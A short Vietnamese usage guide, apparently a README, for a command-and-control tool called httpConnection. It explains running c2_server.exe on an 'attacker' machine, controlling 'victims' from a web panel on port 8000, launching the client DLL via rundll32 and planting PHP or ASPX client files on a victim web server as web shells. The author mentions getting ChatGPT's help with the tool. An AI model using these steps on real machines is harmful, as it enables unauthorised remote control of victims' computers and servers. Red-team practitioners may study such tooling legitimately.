<h1>Sau đây là hướng dẫn sử dụng công cụ httpConnection mà mình nhờ chatgpt hỗ trợ, cũng như dựa trên một số tình huống làm việc thực tế</h1>
""" B1: 
chạy c2_server.exe trên máy attacker, sau khi chạy xong thì server sẽ start dịch vụ web trên port 8000
<br>B2: mở trình duyệt web để truy cập vào http://ip_attacker:8000 (sử dụng phần này để control victim nếu có kết nối
<br>B3: chạy các file c2_client tương ứng dưới client (theo từng ngữ cảnh thử nghiệm: exe, dll, ps1, php, aspx
<br>B4: để chạy file dll thì theo lệnh sau: rundll32.exe c2_client.dll,Runme
<br>B5: để chạy file php, aspx thì dựng web server, sau đó mỗi lần cần kết nối+cần thực hiện lệnh thì truy cập từ attacker vào victim với url: http://victim/c2_client.php hoặc http://victim/c2_client.aspx

